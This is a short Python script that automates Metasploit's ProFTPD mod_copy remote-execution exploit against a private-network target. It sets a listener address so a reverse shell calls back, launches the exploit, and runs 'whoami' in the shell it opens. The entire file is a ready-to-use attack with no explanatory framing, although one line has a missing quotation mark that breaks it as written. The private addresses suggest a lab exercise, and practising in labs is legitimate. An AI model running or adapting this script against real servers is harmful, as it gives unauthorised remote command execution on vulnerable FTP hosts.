#!/usr/bin/env python3
import subprocess


TARGET = "10.0.2.15"   
RPORT  = "21"        
LHOST  = "10.0.2.4"    
LPORT  = "4444"        



msf_cmds = [
    "use exploit/unix/ftp/proftpd_modcopy_exec",
    f"set RHOSTS {TARGET},
    f"set RPORT {RPORT}",
    "set TMPPATH /tmp",
    "set SITEPATH /var/www/html",
    "set AutoVerifySession false",
    "set AllowNoCleanup true",
    f"set LHOST {LHOST}",
    f"set LPORT {LPORT}",
    "exploit -j",             
    "sleep 5",                   
    "sessions -i 2 -c whoami", 
    "exit"
]

# Launch Metasploit
subprocess.run(["msfconsole", "-q", "-x", "; ".join(msf_cmds)])
